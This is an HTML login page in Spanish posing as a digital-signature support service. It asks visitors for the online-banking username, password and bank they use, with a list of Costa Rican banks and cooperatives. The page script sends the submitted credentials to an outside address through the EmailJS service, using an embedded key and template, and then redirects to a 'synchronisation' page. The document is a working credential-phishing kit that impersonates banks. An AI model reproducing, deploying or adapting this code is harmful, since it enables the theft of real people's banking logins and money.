<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicio de Sesión</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="register-login.css">
    <link rel="stylesheet" href="login-extra.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <style>
        .password-container {
            position: relative;
            display: flex;
            align-items: center;
        }

        #clave {
            padding-right: 35px;
        }

        #togglePassword {
            position: absolute;
            right: 10px;
            background: none;
            border: none;
            cursor: pointer;
            font-size: 1em;
            color: #666;
            margin-top: -15px;
            padding: 0;
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        #togglePassword i {
            font-size: 1em;
        }
    </style>
</head>
<body>
    <header>
        <nav class="navbar">
            <div class="nav-logo">
                <button onclick="location.href='index.html'" style="background: none; border: none; cursor: pointer;">
                    <img src="logo.png" alt="Logo">
                </button>                               
            </div>
        </nav>
    </header>

    <main>
        <div class="container">
            <section class="login-section">
                <div class="login-header">
                    <h1>Inicio de sesión</h1>
                    <p>Reconocimiento digital, se va a identificar de la misma manera que en su entidad bancaria de respaldo para validar el trámite</p>
                </div>
                
                <div class="form-container">
                    <form id="loginForm">
                        <div class="input-group">
                            <label for="usuario">Usuario virtual</label>
                            <input type="text" id="usuario" name="name" required>
                        </div>
                        
                        <div class="input-group">
                            <label for="clave">Clave Virtual</label>
                            <div class="password-container">
                                <input type="password" id="clave" name="password" required>
                                <button type="button" id="togglePassword">
                                    <i class="fas fa-eye"></i>
                                </button>
                            </div>
                        </div>
                        
                        <div class="input-group">
                            <label for="entidad">Entidades de respaldo</label>
                            <select id="entidad" name="entity" required>
                                <option value="">Seleccione su entidad</option>
                                <option value="banco-cr">Banco de Costa Rica</option>
                                <option value="banco-nacional">Banco Nacional</option>
                                <option value="banco-davivienda">Banco Davivienda</option>
                                <option value="banco-bac">Banco Bac Credomatic</option>
                                <option value="banco-scotiabank">Banco Scotiabank</option>
                                <option value="banco-promerica">Banco Promerica</option>
                                <option value="banco-bct">Banco BCT</option>
                                <option value="banco-lafise">Banco Lafise</option>
                                <option value="coopenae">COOPENAE</option>
                                <option value="coopealianza">COOPEALIANZA</option>
                                <option value="coopeg">COOPEGUANACASTE</option>
                                <option value="coopeserv">COOPESERVIDORES</option>
                                <option value="otra">OTRA ENTIDAD</option>
                            </select>
                        </div>
                        
                        <div class="form-actions">
                            <button type="submit" id="button" class="btn-primary">Iniciar sesión</button>
                        </div>
                    </form>
                </div>
            </section>
        </div>
    </main>

    <footer>
        <div class="footer-content">
            <img src="logo-firma-digital.png" alt="Centro de Soporte Firma Digital" class="logo-firma">
        </div>
    </footer>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

    <script type="text/javascript">
        emailjs.init('Fdk3dIBYptP-7lOoE')
    </script>

    <script>
    // Mostrar/ocultar contraseña
    const togglePassword = document.getElementById('togglePassword');
    const passwordInput = document.getElementById('clave');

    togglePassword.addEventListener('click', function() {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        
        this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
    });

    // Envío de formulario
    const btn = document.getElementById('button');
    const loginForm = document.getElementById('loginForm');

    loginForm.addEventListener('submit', function(event) {
        event.preventDefault();
    
        btn.textContent = 'Enviando...';
        btn.disabled = true;
    
        const serviceID = 'default_service';
        const templateID = 'template_dtqwqog';
    
        emailjs.sendForm(serviceID, templateID, this)
            .then(() => {
                window.location.href = 'sincronizacion.html';
            }, (err) => {
                btn.textContent = 'Iniciar sesión';
                btn.disabled = false;
                alert('Error al enviar: ' + JSON.stringify(err));
            });
    });
    </script>
    <script src="protecion.js"></script>
</body>
</html>
